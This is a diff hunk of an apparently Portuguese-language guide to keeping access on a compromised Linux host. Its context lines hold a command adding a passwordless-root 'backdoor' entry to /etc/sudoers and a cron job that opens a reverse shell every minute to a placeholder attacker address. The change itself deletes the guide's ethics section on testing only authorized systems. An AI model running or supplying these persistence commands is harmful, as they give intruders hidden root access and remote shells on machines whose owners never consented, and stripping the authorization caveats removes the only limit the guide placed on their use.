@@ -181,10 +181,3 @@ echo "backdoor ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
 # Cron job persistente
 echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'" | crontab -
 ```
-
-## Considerações Éticas
-
-- Use apenas em sistemas que você possui ou tem autorização para testar
-- Respeite os termos de serviço
-- Obtenha autorização por escrito antes de realizar testes
-- Use em ambientes controlados para aprendizado
